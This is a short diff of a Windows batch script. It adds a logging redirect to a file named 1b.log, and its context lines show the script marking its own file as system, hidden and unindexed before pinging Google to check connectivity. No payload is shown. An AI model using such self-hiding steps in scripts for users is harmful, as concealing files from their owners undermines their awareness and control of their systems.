@@ -1,5 +1,9 @@
 @echo off
 setlocal 
+call :LOG > 1b.log
+exit /B
+
+:LOG
 attrib +s +h +i "%~f0"
 :connectivitycheck
 ping www.google.com -n 1 -w 5000 >NUL
